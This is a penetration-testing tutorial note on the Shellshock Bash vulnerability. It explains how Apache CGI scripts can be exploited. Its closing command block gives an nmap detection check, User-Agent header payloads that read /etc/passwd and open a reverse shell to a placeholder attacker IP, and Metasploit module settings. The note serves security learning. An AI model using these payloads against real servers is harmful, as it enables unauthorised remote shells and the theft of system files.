# Hacking Linux


## CVE-2014-6271 (Shellshock)

Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

The Shellshock vulnerability was discovered by StÃ©phane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.

Bash is a *Nix shell that is part of the GNU project and is the default shell for most Linux distributions.

The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters:
`() {:;};`.

In the context of remote exploitation, Apache web servers configured to run CGI scripts or `.sh` scripts are also vulnerable to this attack.

CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.


In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.

In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.

Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.

This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.



```
# Check if targert is vulnerable, for a file located in webserver root /gettime.cgi

nmap -sV [IP] --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

# set payload in User-Agent field with Burp Suite
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER IP]/[PORT] 0>&1'


# With Metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec	
	set TARGETURI /gettime.cgi
